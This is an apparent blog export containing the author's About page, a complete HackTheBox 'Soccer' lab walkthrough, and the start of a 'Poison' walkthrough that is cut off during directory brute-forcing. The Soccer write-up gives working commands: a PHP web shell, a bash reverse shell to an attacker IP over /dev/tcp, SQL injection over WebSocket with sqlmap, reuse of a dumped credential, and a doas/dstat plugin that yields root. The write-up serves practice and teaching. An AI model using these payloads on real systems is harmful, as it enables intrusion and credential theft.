[{"content":"ARAHARAN LOGANAYAGAM üõ°Ô∏è\rCybersecurity Engineer\rüìç\rLondon, United Kingdom\rüìß\raraharan.x.loganayagam@hotmail.com\rüåê\rConnect With Me\rLinkedIn\rProfessional Network\nGitHub\rCode Repository\nMedium\rTechnical Articles\nTwitter\rSecurity Updates\nAbout This Blog \u0026amp; Who I Am I\u0026rsquo;m Araharan Loganayagam, a passionate Cybersecurity Engineer based in London, specializing in modern security challenges across cloud, AI, and application ecosystems. This platform serves as my digital fortress where I share cutting-edge insights, battle-tested techniques, and real-world security methodologies with the global cybersecurity community.\nüéØ What Drives Me üõ°Ô∏è\rDigital Defense Architecture\rBuilding resilient digital defenses in the age of AI and cloud transformation through innovative security frameworks.\n‚ö°\rCommunity Empowerment\rEmpowering security professionals with next-generation defensive techniques and cutting-edge methodologies.\nüåâ\rSecurity Evolution\rBridging the gap between traditional security and modern threat landscapes in AI and cloud environments.\nüìö\rKnowledge Democracy\rDemocratizing advanced security knowledge for all skill levels through practical, actionable intelligence.\nI believe cybersecurity is an art form that combines technical excellence with strategic thinking. Through my extensive experience spanning penetration testing, DevSecOps, cloud security architecture, and AI security research, I\u0026rsquo;ve witnessed the evolution of threats and the critical need for adaptive defensive strategies.\nüß† My Security Philosophy üè∞\rDefense in Depth\rMultiple layers of security controls\nImplementing overlapping security measures to create robust defense mechanisms that protect against various attack vectors.\nüîí\rZero Trust Architecture\rNever trust, always verify\nAssuming breach and continuously validating every transaction and interaction within the security perimeter.\n‚¨ÖÔ∏è\rShift Left Security\rSecurity integrated from design phase\nEmbedding security considerations early in the development lifecycle to prevent vulnerabilities before they occur.\nüì°\rContinuous Monitoring\rReal-time threat detection \u0026 response\nImplementing persistent monitoring and automated response systems to detect and mitigate threats in real-time.\nü§ù\rKnowledge Sharing\rCommunity-driven security enhancement\nFostering collaborative security through open knowledge sharing and community-driven threat intelligence.\nüéØ\rCore Approach\rProactive defense through continuous learning and adaptation\nEvolving security strategies based on emerging threats, new technologies, and lessons learned from real-world incidents to stay ahead of adversaries.\nMy Approach to Security Innovation-Driven: Exploring cutting-edge security technologies and methodologies Hands-on Validation: Every technique shared here has been rigorously tested in real environments Threat-Informed Defense: Security strategies based on actual adversary tactics and techniques Community Empowerment: Building a stronger security ecosystem through knowledge transfer Continuous Evolution: Adapting to emerging threats in AI, cloud, and platform security Practical Implementation: Focus on deployable solutions for real-world challenges Technical Expertise \u0026amp; Security Domains üõ°Ô∏è Core Security Specializations üì±\rModern Application Security\rüîç Methodologies:\nSAST ‚Ä¢ DAST ‚Ä¢ IAST ‚Ä¢ SCA ‚Ä¢ Container Scanning\nüìã Frameworks:\nOWASP Top 10 ‚Ä¢ SANS Top 25 ‚Ä¢ NIST Secure SDLC\nüéØ Focus Areas:\nAPI Security ‚Ä¢ Microservices ‚Ä¢ Serverless\n‚öôÔ∏è\rDevSecOps \u0026 Platform Security\rüîó Integration Points:\nIDE ‚Ä¢ SCM ‚Ä¢ CI/CD ‚Ä¢ Registry ‚Ä¢ Runtime\nüö™ Security Gates:\nPolicy as Code ‚Ä¢ Automated Testing ‚Ä¢ Compliance\nüèóÔ∏è Platform Security:\nKubernetes ‚Ä¢ Docker ‚Ä¢ Infrastructure as Code\nü§ñ\rAI/ML Security (MLOps)\r‚ö†Ô∏è Emerging Threats:\nModel Poisoning ‚Ä¢ Adversarial Attacks ‚Ä¢ Data Poisoning\nModel Extraction ‚Ä¢ Privacy Inference ‚Ä¢ Prompt Injection\nüõ°Ô∏è Defense Strategies:\nDifferential Privacy ‚Ä¢ Federated Learning Security\nModel Validation ‚Ä¢ Adversarial Training\n‚òÅÔ∏è\rCloud Security Architecture\rüüß AWS Security:\nIAM ‚Ä¢ GuardDuty ‚Ä¢ Security Hub ‚Ä¢ Config ‚Ä¢ CloudTrail\nüî∑ Azure Security:\nSentinel ‚Ä¢ Defender ‚Ä¢ Key Vault ‚Ä¢ Security Center\nüî¥ GCP Security:\nSecurity Command Center ‚Ä¢ IAM ‚Ä¢ Cloud Armor\n‚öì Kubernetes:\nPod Security ‚Ä¢ RBAC ‚Ä¢ Network Policies ‚Ä¢ Service Mesh\nüîç\rThreat Detection \u0026 Response\rüìä SIEM Platforms:\nSplunk ‚Ä¢ Azure Sentinel ‚Ä¢ Elastic Security\nüéØ Threat Hunting:\nMITRE ATT\u0026CK ‚Ä¢ Sigma Rules ‚Ä¢ Yara Rules\nüö® Incident Response:\nDigital Forensics ‚Ä¢ Malware Analysis ‚Ä¢ Timeline Analysis\nüíª Programming \u0026amp; Technology Stack Languages \u0026amp; Frameworks üêç\rPython\rSecurity Automation \u0026 AI/ML Tools\nAdvanced scripting for security automation, machine learning security tools, threat analysis, and malware detection systems.\nüêπ\rGolang\rHigh-Performance Security Utilities\nCloud-native security tools, high-performance network scanners, container security utilities, and microservices protection.\nüêö\rBash\rSystem Administration \u0026 Automation\nSystem hardening scripts, log analysis automation, security monitoring, and infrastructure configuration management.\nüíô\rPowerShell\rWindows Security \u0026 AD Management\nWindows security automation, Active Directory security assessments, endpoint security management, and compliance auditing.\nDevOps \u0026amp; Cloud Technologies üüß\rAWS Security Platform\r‚òÅÔ∏è Core Services:\nEC2 ‚Ä¢ Lambda ‚Ä¢ S3 ‚Ä¢ IAM\nGuardDuty ‚Ä¢ Security Hub ‚Ä¢ Config ‚Ä¢ CloudTrail\nüî∑\rAzure Security Ecosystem\r‚òÅÔ∏è Security Suite:\nSentinel ‚Ä¢ Defender for Cloud\nKey Vault ‚Ä¢ Security Center ‚Ä¢ Purview\nüî¥\rGCP Security Solutions\r‚òÅÔ∏è Security Stack:\nSecurity Command Center ‚Ä¢ IAM\nCloud Armor ‚Ä¢ Binary Authorization\nüê≥\rContainer Security\rDocker Security:\nContainer security, image scanning, runtime protection\n‚öì Kubernetes:\nPod security, RBAC, network policies, admission controllers\nüîß\rCI/CD Security\rJenkins:\nCI/CD security integration, pipeline hardening\nGitLab CI:\nSAST/DAST integration, security scanning\nüèóÔ∏è\rInfrastructure as Code\rTerraform:\nInfrastructure security, policy as code\nüì¶ Ansible:\nConfiguration management \u0026 system hardening\nüõ†Ô∏è Security Tools Arsenal Offensive Security \u0026amp; Penetration Testing üîç\rReconnaissance\rNetwork Discovery \u0026 OSINT\nNmap ‚Ä¢ Amass ‚Ä¢ Subfinder ‚Ä¢ Masscan\ntheHarvester ‚Ä¢ Shodan ‚Ä¢ Censys\nüåê\rWeb Application\rWeb App Pentesting Suite\nBurp Suite ‚Ä¢ OWASP ZAP ‚Ä¢ Nikto\nSQLMap ‚Ä¢ Gobuster ‚Ä¢ Dirb\nüîë\rActive Directory\rAD Attack \u0026 Enumeration\nBloodhound ‚Ä¢ Impacket ‚Ä¢ Responder\nMimikatz ‚Ä¢ Rubeus ‚Ä¢ PowerView\nüöÄ\rExploitation\rExploit Development \u0026 C2\nMetasploit ‚Ä¢ Cobalt Strike ‚Ä¢ Empire\nCovenant ‚Ä¢ Sliver ‚Ä¢ PoshC2\nüì°\rNetwork Analysis\rTraffic Analysis \u0026 Monitoring\nWireshark ‚Ä¢ TCPDump ‚Ä¢ Zeek\nSuricata ‚Ä¢ NetworkMiner\nDefensive Security \u0026amp; Monitoring üñ•Ô∏è\rSIEM Platforms\rüü† Splunk:\nEnterprise security monitoring and analytics\nüî∑ Azure Sentinel:\nCloud-native SIEM and SOAR platform\nüü° Elastic Security:\nOpen-source security analytics\nüõ°Ô∏è\rEndpoint Protection\rü¶Ö CrowdStrike Falcon:\nAdvanced threat detection \u0026 response\nüî∑ Microsoft Defender:\nIntegrated Windows security suite\nü§ñ SentinelOne:\nAI-powered endpoint protection\nüê≥\rContainer Security\rüåä Aqua Security:\nContainer runtime protection\nü¶Ö Falco:\nRuntime security monitoring\nüîí Twistlock/Prisma:\nContainer vulnerability management\nCode \u0026amp; Application Security üîç\rSAST Tools\rüîç SonarQube:\nCode quality and security analysis\n‚ö° Semgrep:\nFast static analysis for multiple languages\nüîí Checkmarx:\nEnterprise SAST solution\nüõ†Ô∏è CodeQL:\nSemantic code analysis by GitHub\nüåê\rDAST Tools\rüåê OWASP ZAP:\nDynamic application security testing\nüéØ Burp Suite:\nWeb application penetration testing\n‚ö° Nuclei:\nFast vulnerability scanner with templates\nüì¶\rContainer Scanning\rüê≥ Trivy:\nContainer vulnerability scanner\nüì¶ Grype:\nContainer \u0026 filesystem scanner\nüîç Clair:\nStatic container vulnerability analysis\nüìã Security Frameworks \u0026amp; Standards ‚öîÔ∏è\rOffensive Security Frameworks\rüéØ MITRE ATT\u0026CK:\nAdversary tactics, techniques, and procedures\nüîç OWASP Testing Guide:\nWeb application security testing methodology\nüõ°Ô∏è\rDefensive Security Frameworks\rüèõÔ∏è NIST Cybersecurity Framework:\nIdentify, Protect, Detect, Respond, Recover\nüìú ISO 27001/27002:\nInformation security management systems\nüìã\rCompliance Standards\rüá™üá∫ GDPR:\nData protection and privacy regulations\nüè¢ SOC 2:\nSecurity, availability, and confidentiality\nüí≥ PCI DSS:\nPayment card industry security standards\nEducation University of West London Master of Science, Cyber Security | Distinction\nLondon, United Kingdom | 2022 - 2023\nRelevant Coursework: Infrastructure Automation, Data Pipelines, Cyber-security, Application Security, Penetration Testing, Security Operations, Spark, Machine Learning\nUniversity of Moratuwa BSc (Hons), Information Technology | 2:1\nMoratuwa, Sri Lanka | 2017 ‚Äì 2021\nRelevant Coursework: Data Structures and Algorithms, Software Design and Development, NLP, Computer Networks, IT Project Management, Cluster Computing, Computational Mathematics, Computer Architecture, Operating Systems, Object Oriented Analysis and Design, Performance Evaluation of Computer Networks\nüî¨ Research Projects üîó\rBlockchain \u0026 ML-based Malware Detection\rMSc Research Project\nDeveloped a decentralized system using Blockchain and Machine Learning for advanced malware detection and file integrity verification, contributing valuable insights to the intersection of Blockchain and cybersecurity.\nüèóÔ∏è Architecture:\n‚Ä¢ Proof of Work Consensus Algorithm\n‚Ä¢ Random Forest, SVM, Neural Networks\n‚Ä¢ Peer-to-Peer Network \u0026 Node Discovery\nüíª Technologies:\nPython ‚Ä¢ Blockchain ‚Ä¢ ML Classifiers ‚Ä¢ P2P Networks\nüß†\rKids Learning Enhancement through NLP\rBSc Research Project\nDeveloped a system enabling kids to create video content by analyzing text, fostering engagement through interactive question-based learning experiences using advanced NLP techniques.\nü§ñ AI Components:\n‚Ä¢ BERT-based Text Analysis\n‚Ä¢ LSTM for Sequence Processing\n‚Ä¢ Interactive Question Generation\nüíª Technologies:\nNLP ‚Ä¢ Python ‚Ä¢ BERT ‚Ä¢ LSTM ‚Ä¢ PyTorch ‚Ä¢ XGBoost ‚Ä¢ Spacy ‚Ä¢ Google API\nüåæ\rAgricultural Social Network (Agri Aid)\rFull-Stack Development Project\nCreated a comprehensive web and mobile application connecting farmers and middlemen with weather forecasts, discussion forums, information center, and agricultural market services.\nüöÄ Features:\n‚Ä¢ Weather Forecast Integration\n‚Ä¢ Farmer-Middleman Marketplace\n‚Ä¢ Discussion Forums \u0026 Information Center\nüíª Technologies:\nMySQL ‚Ä¢ Spring Boot ‚Ä¢ Android Studio ‚Ä¢ Angular ‚Ä¢ CSS ‚Ä¢ Firebase ‚Ä¢ HTML5\nüèÜ Certifications \u0026amp; Professional Badges üéØ Cybersecurity Certifications Offensive Security (OffSec) Offensive Security Certified Professional (OSCP)\nStatus: In Progress\nAdvanced penetration testing and ethical hacking\r‚úÖ Completed Certifications Practical Ethical Hacking\nTCM Security - Hands-on penetration testing\rComputer Networking\nGoogle - Network fundamentals and protocols\rCybersecurity Tools \u0026 Attacks\nIBM - Security tools and threat analysis\rGo Programming\nHackerRank - Advanced Go development skills\rExtra Curricular Activities Security Community Engagement # Hack the Box Profile $ htb-toolkit --user realspaceeagle --challenges completed # Actively participating in CTF challenges # Demonstrating problem-solving and technical acumen Global Perspective \u0026amp; Community Service Multicultural Experiences: Extensive travel fostering adaptability and cross-cultural communication AIESEC Global Village Programme: Contributing to charity initiatives in Sri Lanka Community Leadership: Volunteering for local projects promoting social responsibility Technical Community: Active participation in cybersecurity forums and knowledge sharing üìö What You\u0026rsquo;ll Discover on This Blog This platform serves as your comprehensive cybersecurity knowledge repository, featuring:\nüéØ Core Content Areas üîç\rAdvanced Reconnaissance \u0026 OSINT\rIntelligence Gathering Techniques:\n‚Ä¢ Subdomain Discovery \u0026 DNS Enumeration\n‚Ä¢ Social Media Intelligence (SOCMINT)\n‚Ä¢ Infrastructure Mapping \u0026 Tech Fingerprinting\n‚Ä¢ Dark Web Monitoring \u0026 Threat Intelligence\nüêß\rLinux Security \u0026 System Hardening\rüõ°Ô∏è System Hardening: SELinux ‚Ä¢ AppArmor ‚Ä¢ Kernel Hardening\nüê≥ Container Security: Docker ‚Ä¢ Kubernetes Hardening\nüìä Monitoring: Auditd ‚Ä¢ AIDE ‚Ä¢ Log Analysis\n‚öôÔ∏è Automation: Security Scripts ‚Ä¢ Compliance Checking\n‚òÅÔ∏è\rCloud Security Architecture\rüüß AWS Security: IAM Deep Dives ‚Ä¢ GuardDuty Analysis\nüî∑ Azure Security: Sentinel Playbooks ‚Ä¢ Security Center\n‚öì Kubernetes: Pod Security ‚Ä¢ RBAC ‚Ä¢ Network Policies\nüîß DevSecOps: Pipeline Security ‚Ä¢ Infrastructure as Code\nü§ñ\rAI/ML Security Research\rüö® Emerging Threats:\n‚Ä¢ Adversarial ML Attacks ‚Ä¢ Model Poisoning\n‚Ä¢ Privacy-Preserving ML Security\nüõ°Ô∏è Defensive Strategies:\n‚Ä¢ MLOps Security Pipelines ‚Ä¢ Model Validation\n‚Ä¢ AI Red Team Methodologies\nüì±\rApplication Security Deep Dives\rüåê API Security: GraphQL ‚Ä¢ REST API ‚Ä¢ OAuth Attacks\nüîß DevSecOps: SAST/DAST ‚Ä¢ Security as Code\nüì¶ Container Security: Image Scanning ‚Ä¢ Runtime Protection\n‚ö° Serverless: Lambda Security ‚Ä¢ FaaS Threats\nüéì Learning Formats üìù\rIn-Depth Tutorials\rStep-by-step practical guides with real-world scenarios and hands-on implementation.\nüî¨\rSecurity Research\rOriginal vulnerability research and proof-of-concepts with detailed analysis.\nüõ†Ô∏è\rTool Development\rCustom security tools and automation scripts for enhanced productivity.\nüìä\rThreat Analysis\rCurrent threat landscape analysis and defensive strategies.\nüéØ\rCTF Writeups\rCapture the Flag solutions and advanced penetration testing methodologies.\nüöÄ\rProject Showcases\rEnd-to-end security implementation projects with complete documentation.\nüèÜ Achievements \u0026amp; Recognition üéñÔ∏è Professional Milestones üîí\rSecurity Expertise\rMSc Cybersecurity with Distinction\nUniversity of West London ‚Ä¢ 2023\nAdvanced cybersecurity education with focus on modern threats and defensive strategies.\nüî¨\rResearch Contributions\rBlockchain-based Malware Detection System\nInnovation: Decentralized threat intelligence sharing\nImpact: Enhanced collaborative security defense mechanisms for the community.\nüåê\rCommunity Impact\rTechnical Blog \u0026 Knowledge Sharing\nReach: Global cybersecurity community\nFocus: Practical security implementations and educational content for professionals.\nüéØ Technical Achievements üèÖ\rHack The Box Active Member\rContinuous skill development and CTF participation in the global cybersecurity community.\nüîç\rSecurity Research\rOriginal vulnerability research and responsible disclosure practices for enhanced security.\nüõ†Ô∏è\rOpen Source Contributor\rDevelopment of security tools and defensive technologies for the community.\nüìö\rKnowledge Sharing\rTechnical writing and community education through practical security content.\nüåü Join the Security Journey üöÄ\rElevate Your Security Skills\rReady to take your cybersecurity expertise to the next level with advanced techniques and methodologies?\nüîí\rCutting-Edge Techniques\rExplore the latest security methodologies and defensive strategies used by industry professionals.\nüåê\rCommunity of Professionals\rJoin a vibrant community of passionate security professionals sharing knowledge and experiences.\nüí°\rActionable Intelligence\rTransform complex security concepts into practical, actionable intelligence for real-world applications.\nüõ°Ô∏è \u0026ldquo;Security is not a destination, but a continuous journey of learning, adapting, and defending against an ever-evolving threat landscape. Together, we build a more secure digital world.\u0026rdquo;\nüî• Latest Focus Areas:\nü§ñ AI Security \u0026amp; MLOps Implementation ‚òÅÔ∏è Cloud-Native Security Architecture üîß DevSecOps Pipeline Automation üéØ Zero Trust Security Models ","permalink":"https://realspaceeagle.github.io/about/","summary":"\u003ch1 id=\"araharan-loganayagam\"\u003eARAHARAN LOGANAYAGAM\u003c/h1\u003e\n\u003cdiv style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 25px; margin: 30px 0;\"\u003e\r\n\u003c!-- Professional Profile Card --\u003e\r\n\u003cdiv style=\"border: 2px solid #00ff41; border-radius: 15px; padding: 30px; background: linear-gradient(135deg, #0a0a0a, #1a1a1a); box-shadow: 0 8px 25px rgba(0, 255, 65, 0.3); transition: all 0.3s ease; position: relative; overflow: hidden;\"\u003e\r\n\u003cdiv style=\"position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, #00ff41, #00a832);\"\u003e\u003c/div\u003e\r\n\u003cdiv style=\"text-align: center; margin-bottom: 20px;\"\u003e\r\n\u003cdiv style=\"font-size: 48px; margin-bottom: 15px;\"\u003eüõ°Ô∏è\u003c/div\u003e\r\n\u003ch2 style=\"color: #00ff41; margin: 0 0 10px 0; font-size: 28px; font-weight: 700;\"\u003eCybersecurity Engineer\u003c/h2\u003e\r\n\u003cdiv style=\"display: flex; flex-direction: column; gap: 12px; margin-top: 20px;\"\u003e\r\n\u003cdiv style=\"display: flex; align-items: center; justify-content: center; gap: 10px;\"\u003e\r\n\u003cspan style=\"font-size: 20px;\"\u003eüìç\u003c/span\u003e\r\n\u003cspan style=\"color: #cccccc; font-size: 16px; font-weight: 500;\"\u003eLondon, United Kingdom\u003c/span\u003e\r\n\u003c/div\u003e\r\n\u003cdiv style=\"display: flex; align-items: center; justify-content: center; gap: 10px;\"\u003e\r\n\u003cspan style=\"font-size: 20px;\"\u003eüìß\u003c/span\u003e\r\n\u003ca href=\"mailto:araharan.x.loganayagam@hotmail.com\" style=\"color: #00ff41; text-decoration: none; font-size: 16px; font-weight: 500; transition: color 0.3s ease;\"\u003earaharan.x.loganayagam@hotmail.com\u003c/a\u003e\r\n\u003c/div\u003e\r\n\u003c/div\u003e\r\n\u003c/div\u003e\r\n\u003c/div\u003e\r\n\u003c!-- Social Media Connection Card --\u003e\r\n\u003cdiv style=\"border: 2px solid #667eea; border-radius: 15px; padding: 30px; background: linear-gradient(135deg, #0a0a0a, #1a1a1a); box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3); transition: all 0.3s ease; position: relative; overflow: hidden;\"\u003e\r\n\u003cdiv style=\"position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, #667eea, #764ba2);\"\u003e\u003c/div\u003e\r\n\u003cdiv style=\"text-align: center; margin-bottom: 20px;\"\u003e\r\n\u003cdiv style=\"font-size: 48px; margin-bottom: 15px;\"\u003eüåê\u003c/div\u003e\r\n\u003ch3 style=\"color: #667eea; margin: 0 0 20px 0; font-size: 24px; font-weight: 600;\"\u003eConnect With Me\u003c/h3\u003e\r\n\u003c/div\u003e\r\n\u003cdiv style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px;\"\u003e\r\n\u003ca href=\"https://www.linkedin.com/in/dream4ip/\" target=\"_blank\" style=\"text-decoration: none; display: block; padding: 15px; background: linear-gradient(135deg, #1a1a1a, #2a2a2a); border: 1px solid #0077b5; border-radius: 10px; transition: all 0.3s ease; text-align: center;\" onmouseover=\"this.style.transform='translateY(-3px)'; this.style.boxShadow='0 6px 20px rgba(0, 119, 181, 0.4)'\" onmouseout=\"this.style.transform='translateY(0)'; this.style.boxShadow='none'\"\u003e\r\n\u003cdiv style=\"font-size: 24px; margin-bottom: 8px;\"\u003e\r\n\u003csvg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"#0077b5\" style=\"display: block; margin: 0 auto;\"\u003e\r\n\u003cpath d=\"M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z\"/\u003e\r\n\u003c/svg\u003e\r\n\u003c/div\u003e\r\n\u003ch4 style=\"color: #0077b5; margin: 0 0 5px 0; font-size: 14px; font-weight: 600;\"\u003eLinkedIn\u003c/h4\u003e\r\n\u003cp style=\"color: #cccccc; margin: 0; font-size: 12px;\"\u003eProfessional Network\u003c/p\u003e","title":"About"},{"content":"Soccer is a Linux machine that mixes classic web exploitation with modern twists such as WebSocket SQL injection and a doas-backed privilege escalation path. This post follows the exact notes I used during the engagement and includes the screenshots from my original write-up.\nLab Preparation # change into your working directory cd /opt/htb/soccer # connect to the HackTheBox VPN sudo openvpn lab_Dream4ip.ovpn # add the box to /etc/hosts sudo tee -a /etc/hosts \u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; 10.10.11.194 soccer.htb EOF A few helper aliases show up throughout the notes: LPORT references my attack box IP and RPORT the target. Keep them in mind when adapting the payloads.\nReconnaissance Port Scanning sudo nmap -sC -sV -oA nmap/soccer 10.10.11.194 nmap -p- -oA nmap/allports 10.10.11.194 sudo nmap -sU --min-rate 10000 -oA nmap/udp 10.10.11.194 The interesting hits were:\nPort Service Notes 22/tcp OpenSSH 8.2p1 standard Ubuntu banner 80/tcp nginx 1.18.0 redirects to soccer.htb 9091/tcp HTTP API responds with JSON errors and 404s Enumerating soccer.htb Directory Bruteforce gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php feroxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt The enumeration turns up /tiny, a deployment of Tiny File Manager 2.4.3 that still accepts the default credentials (admin : admin@123).\nInside the panel we can upload arbitrary files into /tiny/uploads/.\nReverse Shell Upload # listener rlwrap nc -nlvp 9001 # simple PHP dropper (uploaded as shell.php) \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; # trigger the payload curl \u0026#34;http://soccer.htb/tiny/uploads/shell.php?cmd=bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; From the web shell we quickly upgrade to a full TTY using the usual combo:\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z stty raw -echo; fg export TERM=xterm Pivoting to soc-player.soccer.htb While combing through nginx we find an additional virtual host definition.\ncat /etc/nginx/sites-enabled/soc-player.htb The site hosts a match stats portal that communicates over a WebSocket endpoint on port 9091.\nEnumerating the WebSocket API An unauthenticated request to /check exposes an account verification workflow. Replaying it with invalid data produces deterministic JSON responses and‚Äîcritically for us‚Äîfeeds directly into the back-end database query.\nWe can interact with the socket in real time:\nwscat -c ws://soc-player.soccer.htb:9091/ws {\u0026#34;id\u0026#34;:\u0026#34;92130\u0026#34;} The endpoint is vulnerable to SQL injection. Sending {\u0026quot;id\u0026quot;:\u0026quot;92130 or 5=1-- -\u0026quot;} yields a different response, confirming Boolean-based injection.\nWeaponising sqlmap over WebSockets sqlmap can drive WebSocket traffic with the -u ws:// syntax:\nsqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --batch sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --level 5 --risk 3 --dbs sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; -D soccer_db -T users -C username,password --dump Dumping the users table provides the player account password, PlayerOftheMatch2022.\nsshpass -p \u0026#39;PlayerOftheMatch2022\u0026#39; ssh player@10.10.11.194 -t bash Post-Exploitation Enumeration With an interactive shell we sweep for privilege escalation paths:\nfind / -maxdepth 3 -name \u0026#39;doas*\u0026#39; 2\u0026gt;/dev/null find / -group player 2\u0026gt;/dev/null | grep -v \u0026#39;^/proc\\|^/run\\|^/sys\u0026#39; cat /usr/local/etc/doas.conf The doas policy allows player to run /usr/bin/dstat as root without a password. The plugin directory /usr/local/share/dstat is group-writable by player, which opens the door for a Python plugin backdoor.\nPrivilege Escalation via dstat Plugins Create a malicious plugin, then execute dstat through doas:\necho \u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39; \u0026gt; /usr/local/share/dstat/dstat_xxx.py doas /usr/bin/dstat --xxx Alternative (user-local) approach:\nmkdir -p ~/.dstat echo \u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39; \u0026gt; ~/.dstat/dstat_xxx.py dstat --xxx Either method drops us into a root shell:\n# id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt Cheatsheet Updates Key commands and payloads from this run were added to:\nSQL Injection Cheatsheet ‚Äì WebSocket-based sqlmap usage and Boolean probes. Linux Privilege Escalation Cheatsheet ‚Äì doas / dstat plugin workflow. Lessons Learned Modern protocols need love ‚Äì Treat WebSocket endpoints exactly as you would REST APIs; interception tools and automation now support them. Default credentials still bite ‚Äì Tiny File Manager ships with admin/admin@123. Changing defaults is table stakes. Least privilege on helper binaries ‚Äì Granting blanket access to dstat with writeable plugin paths hands over root. Automate but verify ‚Äì sqlmap handled the socket payloads, but manual validation with wscat saved time and confirmed behavior. Useful Commands Reference # Quick recon one-liners nmap -sV -sC -p 22,80,9091 10.10.11.194 find / -group player 2\u0026gt;/dev/null | grep -v \u0026#39;^/proc\\|^/run\\|^/sys\u0026#39; # WebSocket probing wscat -c ws://soc-player.soccer.htb:9091/ws {\u0026#34;id\u0026#34;:\u0026#34;92130 or 5=1-- -\u0026#34;} # sqlmap over WebSocket sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --batch # doas + dstat privesc echo \u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39; \u0026gt; /usr/local/share/dstat/dstat_xxx.py doas /usr/bin/dstat --xxx ","permalink":"https://realspaceeagle.github.io/posts/hackthebox-soccer-walkthrough/","summary":"Exploit HackTheBox Soccer by chaining Tiny File Manager defaults, WebSocket SQL injection, and doas+dstat privilege escalation.","title":"HackTheBox: Soccer Walkthrough"},{"content":"Poison is a FreeBSD machine that starts with a web application vulnerable to Local File Inclusion (LFI), which leads to log poisoning and remote code execution. After gaining initial access, I\u0026rsquo;ll find heavily encoded credentials that provide SSH access to the machine. From there, the path to root involves VNC running on localhost that can be accessed through SSH tunneling.\nReconnaissance nmap I\u0026rsquo;ll start my enumeration with nmap and run my standard TCP scan:\n$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.84 Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-15 10:00 EDT Nmap scan report for 10.10.10.84 Host is up (0.065s latency). Not shown: 65530 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 119/tcp open nntp Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds Based on these results, I\u0026rsquo;ll run a deeper nmap scan on the open ports:\n$ nmap -p 22,25,80,110,119 -sCV -oA scans/nmap-tcpscripts 10.10.10.84 Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-15 10:01 EDT Nmap scan report for 10.10.10.84 Host is up (0.065s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA) | 256 4c:e8:c6:02:bd:fc:83:e6:36:00:06:05:65:38:7c:78 (ECDSA) |_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519) 25/tcp open smtp Sendmail 8.15.2/8.15.2 | smtp-commands: Poison.htb, EHLO, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, DELIVERBY, |_List of commands 80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32) |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32 |_http-title: Site doesn\u0026#39;t have a title (text/html). 110/tcp open pop3 Qpopper 4.0.9 119/tcp open nntp INN 2.6.3 Service Info: Host: Poison.htb; OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds The target is running FreeBSD with several services including SSH, SMTP, HTTP, POP3, and NNTP. The most interesting service for initial exploitation is the Apache HTTP server on port 80 running PHP 5.6.32.\nWebsite - TCP 80 Site The website presents a simple interface without much content:\nThe page shows what appears to be a file browser interface. Looking at the HTML source doesn\u0026rsquo;t reveal anything interesting initially.\nDirectory Brute Force I\u0026rsquo;ll run gobuster to find additional paths:\n$ gobuster dir -u http://10.10.10.84 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer 